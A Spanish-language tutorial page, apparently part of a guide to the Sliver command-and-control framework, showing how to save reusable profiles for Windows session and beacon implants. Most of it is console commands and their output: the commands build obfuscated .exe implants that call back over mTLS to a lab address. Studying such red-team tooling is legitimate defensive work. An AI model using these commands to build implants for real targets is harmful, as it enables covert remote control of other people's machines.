# Perfiles

La generación de implantes, tanto beacons como session, puede resultar tediosa, ya que hay que teclear muchas opciones. Para hacerlo más fácil, exciten los <mark style="color:green;">**perfiles reutilizables**</mark> con una configuración de implante común. L

Por ejemplo se crearán dos perfiles de implantes de sesión  y beacon correspondes a los implantes del blog anterior.

## Perfil de session

{% code overflow="wrap" %}
```bash
profiles new --protocol <ip> --os <os> --arch <arch> --format <format> <name>
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sliver > profiles new --mtls 172.19.0.128 --os windows --arch amd64 --format exe implant_session_win64

[*] Saved new implant profile implant_session_win64

sliver > profiles generate --save  . implant_session_win64

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 30s
[*] Implant saved to /home/kali/Documents/sliverTest/BROAD_LEVER.exe

```
{% endcode %}

## Perfil de Beacon

{% code overflow="wrap" %}
```bash
sliver > profiles new beacon --mtls 172.19.0.128 --os windows --arch amd64 --format exe --seconds 5 --jitter 3 implant_beacon_win64

[*] Saved new implant profile (beacon) implant_beacon_win64

sliver > profiles generate --save . implant_beacon_win64

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 31s
[*] Implant saved to /home/kali/Documents/sliverTest/FUZZY_SNEEZE.exe
```
{% endcode %}
